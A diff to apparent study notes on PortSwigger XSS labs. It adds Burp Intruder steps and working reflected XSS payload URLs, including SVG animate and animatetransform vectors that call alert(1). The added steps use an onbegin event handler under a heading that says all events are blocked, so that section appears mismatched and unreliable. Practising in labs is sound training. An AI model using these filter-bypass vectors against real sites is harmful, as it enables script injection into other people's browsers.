@@ -156,6 +156,7 @@ STEP5: Place the cursor before the = character and click "Add §" twice, to crea
 
 
                    ## Reflected XSS with event handlers and href attributes blocked
+                   
 # This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.. 
 # To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function. 
 #  Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:
@@ -163,4 +164,12 @@ STEP5: Place the cursor before the = character and click "Add §" twice, to crea
 
 # https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
                           
-                      
+EXAMPLE: 
+STEP1: When the attack is finished, review the results. Observe that all payloads caused an HTTP 400 response, except for the ones using the <svg>, <animatetransform>, <title>, and <image> tags, which received a 200 response. 
+STEP2: Go back to the Positions tab in Burp Intruder and replace your search term with: <svg><animatetransform%20=1>
+STEP3: Place the cursor before the = character and click "Add §" twice to create a payload position. The value of the search term should now be: <svg><animatetransform%20§§=1>
+STEP4: Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved: 
+
+https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+
+                           
